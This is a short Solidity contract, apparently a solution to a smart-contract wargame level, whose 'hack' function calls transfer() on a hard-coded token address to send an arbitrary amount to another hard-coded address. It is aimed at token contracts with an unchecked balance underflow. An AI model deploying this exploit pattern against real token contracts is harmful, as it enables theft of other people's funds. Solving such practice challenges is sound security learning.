// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {
    IToken token = IToken(0xA67077977FbD0C27596Da9B0c50C9652Ec538686);
    function hack(uint256 amount) public {
        token.transfer(0xBf639FfACbb1B4D597ae22efefe33d5D86fAD6c9, amount);
    }
}

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}